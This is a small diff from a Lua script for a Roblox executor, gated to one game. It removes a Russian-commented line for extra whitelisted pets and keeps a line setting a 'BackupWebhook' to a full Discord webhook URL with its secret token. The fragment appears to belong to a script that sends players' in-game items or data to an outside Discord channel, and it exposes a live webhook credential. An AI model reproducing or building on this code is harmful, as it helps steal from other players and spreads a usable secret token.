@@ -3,8 +3,6 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
--- Дополнительные питомцы, которые можно передать через getgenv().ExtraWhitelist
-local EXTRA_WHITELIST = getgenv().ExtraPets or {}
 
 getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
 
